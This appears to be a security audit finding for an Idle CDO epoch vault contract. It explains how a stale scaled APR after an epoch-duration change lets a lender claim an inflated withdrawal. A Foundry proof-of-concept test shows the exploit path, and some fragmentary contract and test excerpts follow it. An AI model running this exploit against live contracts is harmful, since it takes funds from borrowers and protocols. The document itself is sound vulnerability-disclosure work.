### Title
Stale scaled APR after `setEpochParams` overpays withdrawal receipts - ([File: contracts/IdleCDOEpochVariant.sol](contracts/IdleCDOEpochVariant.sol))

### Summary
`setEpochParams` changes `epochDuration` and `bufferPeriod` without recomputing the strategy’s scaled APR, even though `IdleCreditVault.setAprsWithBuffer` derives `lastApr` from both parameters. [1](#0-0) [2](#0-1) 

A later withdrawal request prices projected interest with the stale `lastApr`, records a fixed claim, burns the tranche position, and queues the inflated amount for borrower funding. [3](#0-2) [4](#0-3) 

### Finding Description
`IdleCreditVault` maintains two related values: `unscaledApr`, the contractual annual rate, and `lastApr`, the rate scaled by the configured epoch duration plus buffer. [5](#0-4) 

`setEpochParams` can change both scaling inputs while an epoch is not running, but it only writes the raw inputs and never calls `_setScaledApr`. [1](#0-0) 

Interest subsequently uses the stale scaled value through `_calcInterest`, while withdrawal requests further scale it back to exclude the buffer period. [6](#0-5) [7](#0-6) 

For an AA-only vault with no fees, changing `(epochDuration, bufferPeriod)` from `(30 days, 5 days)` to `(60 days, 5 days)` at 10% APR leaves `lastApr` at approximately `11.6667e18` instead of the correct `10.8333e18`. [2](#0-1) 

A withdrawal request is therefore priced at approximately `1.7683%` of principal rather than the intended `1.6438%`, creating an excess claim of approximately `0.1245%` of requested principal. [8](#0-7) 

### Impact Explanation
An unprivileged KYC-passing lender can deposit normally, wait for an honest duration increase, request a withdrawal, and receive an immutable receipt for more than the contractual APR entitlement. [9](#0-8) 

At the next `stopEpoch`, the CDO pulls the pending receipt amount from the borrower and the strategy funds the claim, so a successful epoch transfers the excess to the attacker. [10](#0-9) [11](#0-10) 

For 1,000,000 units requested, the deterministic excess is approximately 1,245 units before any fee effects. [8](#0-7) 

The broken invariant is fair burn and payout: one tranche position is converted into a fixed receipt whose interest is derived from APR scaling parameters belonging to the prior duration. [3](#0-2) 

### Likelihood Explanation
The sequence requires only a valid owner or manager duration change followed by an ordinary lender withdrawal request during the buffer. [1](#0-0) [12](#0-11) 

No default, malicious privileged role, oracle manipulation, donation, or reentrancy is required, and the skim, wallet, epoch, and default checks do not refresh the stale scaled APR. [13](#0-12) [1](#0-0) 

The theft is bounded to `0` when duration decreases or when the new duration satisfies the stale scaling relation, but lengthening the epoch creates a positive excess that grows approximately linearly with the requested principal. [2](#0-1) [7](#0-6) 

### Recommendation
Recompute the strategy APR inside `setEpochParams` after both duration values are committed, using the current `unscaledApr` and the new `(epochDuration, bufferPeriod)`. [1](#0-0) [14](#0-13) 

Alternatively, store only the unscaled APR and derive the effective scaled rate at each use so it cannot become stale relative to the current epoch parameters. [6](#0-5) 

Add a regression test asserting that changing epoch duration while APR remains fixed changes withdrawal interest exactly according to the new duration and recomputed scaled APR. [7](#0-6) 

### Proof of Concept
The following Foundry regression is intended to be added to `test/foundry/IdleCreditVault.t.sol` alongside the existing epoch tests. [15](#0-14) 

```solidity
function testStaleScaledAprAfterEpochDurationChange() external {
    // Remove fee and AYS effects so the test isolates APR scaling.
    vm.startPrank(owner);
    cdoEpoch.setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, 0);
    cdoEpoch.setIsAYSActive(false);
    vm.stopPrank();

    // Existing scaling state: 30-day epoch and 5-day buffer at 10% APR.
    vm.startPrank(manager);
    cdoEpoch.setEpochParams(30 days, 5 days);
    IdleCreditVault(address(strategy)).setAprs(
        10e18,
        10e18 * (30 days + 5 days) / 30 days
    );
    vm.stopPrank();

    uint256 principal = 1_000_000 * ONE_SCALE;
    address attacker = makeAddr("durationScalingAttacker");
    _depositWithUser(attacker, principal);

    // Honest manager changes the duration. The paired scaled APR remains stale.
    vm.prank(manager);
    cdoEpoch.setEpochParams(60 days, 5 days);

    uint256 shares = AAtranche.balanceOf(attacker);
    vm.prank(attacker);
    uint256 requested = cdoEpoch.requestWithdraw(shares, address(AAtranche));

    // Correct withdrawal interest excludes the buffer and uses the contractual 10% APR
    // over the new 60-day epoch.
    uint256 fairInterest = principal * 10e18 / 100 * 60 days /
        (365 days * ONE_TRANCHE_TOKEN);
    uint256 fairRequest = principal + fairInterest;

    // Actual interest uses the old 30d+5d scaling against the new 60d duration.
    uint256 staleScaledApr = 10e18 * (30 days + 5 days) / 30 days;
    uint256 staleInterest = principal * staleScaledApr / 100 * 60 days /
        (365 days * ONE_TRANCHE_TOKEN) * 60 days / (60 days + 5 days);
    uint256 staleRequest = principal + staleInterest;

    assertEq(requested, staleRequest, "receipt should expose stale APR scaling");
    assertGt(requested, fairRequest, "stale APR did not overpay request");
    assertApproxEqAbs(
        requested - fairRequest,
        principal * 1_245 / 1_000_000,
        1,
        "unexpected excess"
    );

    // Fund and settle the epoch, then prove the inflated receipt is payable.
    vm.prank(manager);
    cdoEpoch.startEpoch();

    IdleCreditVault creditVault = IdleCreditVault(address(strategy));
    deal(
        defaultUnderlying,
        borrower,
        cdoEpoch.expectedEpochInterest() + creditVault.pendingWithdraws()
    );
    vm.warp(cdoEpoch.epochEndDate() + 1);

    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    uint256 balanceBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();

    assertEq(
        underlying.balanceOf(attacker) - balanceBefore,
        requested,
        "inflated receipt was not paid"
    );
}
```

  function _calcInterestWithdrawRequest(uint256 _amount, address _tranche) internal view returns (uint256 _interest, int256 _diff) {
    uint256 _duration = epochDuration;
    if (_duration == 0) {
      return (_interest, _diff);
    }

    uint256 _buffer = bufferPeriod;
    // calculate total vault interest (they don't get the interest for the buffer period for withdraw requests so 
    // we scale it back since _calcInterest is scaling the interest with tht buffer period),
    uint256 totInterest = _calcInterest(_managedContractValue()) * _duration / (_duration + _buffer);
    // calculate total tranche interest for the whole tranche supply
    uint256 totTrancheInterest = _calcTrancheInterestShare(totInterest, _tranche);
    // calculate interest for the given tranche and given amount
    uint256 _trancheBal = _lastSavedNAV(_tranche);
    _interest = _trancheBal == 0 ? 0 : _amount * totTrancheInterest / _trancheBal;
    // calculate the interest that the _amount would have received if there was no split ratio (ie interest split based only on tvl).
    // This is used to calculate the interest that should be added to the expectedEpochInterest when 
    // withdrawing an AA tranche or the interest that should be removed from expectedEpochInterest when
    // withdrawing a BB tranche
    uint256 interestWithoutSplitRatio = _calcInterest(_amount) * _duration / (_duration + _buffer);
    // difference between total interest and tranche interest (positive for AA, negative for BB)
    _diff = int256(interestWithoutSplitRatio) - int256(_interest);
  }

  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);

      delete apr0Users[_user];
    }

  function testDepositDuringEpochNumericalAA() external {
    // 10% apr, 365-day epoch, no buffer
    vm.startPrank(manager);
    cdoEpoch.setEpochParams(365 days, 0);
    IdleCreditVault(address(strategy)).setAprs(10e18, 10e18);
    vm.stopPrank();

    uint256 initialDeposit = 1000 * ONE_SCALE;
    idleCDO.depositAA(initialDeposit);
    vm.prank(owner);
    cdoEpoch.setIsAYSActive(false);

    _startEpochAndCheckPrices(0);
    uint256 expectedEpochInterest = 100 * ONE_SCALE;
    assertEq(cdoEpoch.expectedEpochInterest(), expectedEpochInterest, 'expectedEpochInterest pre deposit is wrong');

    // Halfway through the epoch
    vm.warp(cdoEpoch.epochEndDate() - (cdoEpoch.epochDuration() / 2));

    vm.prank(owner);
    cdoEpoch.setIsDepositDuringEpochDisabled(false);

    address user = makeAddr('midEpochNumeric');
    uint256 depositAmount = 1000 * ONE_SCALE;
    deal(defaultUnderlying, user, depositAmount);

    // 1000 USDC deposit halfway through a 10% APR epoch earns 50 USDC
    uint256 expectedDepositInterest = 50 * ONE_SCALE;
    // minted = (1050 / 1100) * 1000e18 = 954.545454545454545454e18 (rounded down)
    uint256 expectedMinted = 954545454545454545454;

    uint256 borrowerBal = IERC20Detailed(defaultUnderlying).balanceOf(borrower);
    uint256 strategyTokenBal = IERC20Detailed(address(strategy)).balanceOf(address(cdoEpoch));

    IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), depositAmount);

    assertEq(IERC20Detailed(defaultUnderlying).balanceOf(borrower) - borrowerBal, depositAmount, 'borrower funds are wrong');
